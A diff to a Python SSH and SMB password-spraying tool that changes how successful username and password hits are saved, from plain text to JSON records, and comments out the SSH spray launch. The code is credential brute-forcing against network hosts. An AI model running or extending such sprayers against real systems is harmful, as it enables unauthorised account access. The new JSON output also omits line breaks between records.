@@ -62,11 +62,11 @@ class sshSpray():
         return f
 
     def sshresults(data):
-        with open("scan/sshPasSprayresults.txt", "a") as f:
+        with open("scan/sshPasSprayresults.jsonl", "a") as f:
             f.writelines(data)
 
     def resultreset():
-        f = open("scan/sshPasSprayresults.txt" , "w")
+        f = open("scan/sshPasSprayresults.jsonl" , "w")
         f.write("")
         f.close()
     def spray():
@@ -81,7 +81,12 @@ class sshSpray():
                 for password in passfile:
                     if sshSpray.check_ssh_login(ip , uname, password):
                         print("[!!!] ssh FOUND [!!!] "+ip+" "+"username: "+uname+" password: "+password)
-                        data = f"ip: {ip} username: {uname} password: {password}\n"
+                        payload = {
+                            "ip": ip,
+                            "username": uname,
+                            "password": password
+                        }
+                        data = json.dumps(payload)
                         sshSpray.sshresults(data)
         
                     else:
@@ -128,12 +133,12 @@ class smbSpray():
             return False
 
     def resultreset():
-        f = open("scan/smbPasSprayresults.txt" , "w")
+        f = open("scan/smbPasSprayresults.jsonl" , "w")
         f.write("")
         f.close()
 
     def smbresults(data):
-        with open("scan/smbPasSprayresults.txt", "a") as f:
+        with open("scan/smbPasSprayresults.jsonl", "a") as f:
             f.writelines(data)
     
     def spray():
@@ -148,11 +153,16 @@ class smbSpray():
                 for password in passfile:
                     if smbSpray.check_smb_auth(ip , uname, password):
                         print("[!!!] smb FOUND [!!!] "+ip+" "+"username: "+uname+" password: "+password)
-                        data = f"ip: {ip} username: {uname} password: {password}\n"
+                        payload = {
+                            "ip": ip,
+                            "username": uname,
+                            "password": password
+                        }
+                        data = json.dumps(payload)
                         smbSpray.smbresults(data)
 
                     else:
                         print("smb not found [*] ip: "+ip+" username: "+uname+" password: "+password)
     
 #smbSpray.spray()
-sshSpray.spray()
+#sshSpray.spray()
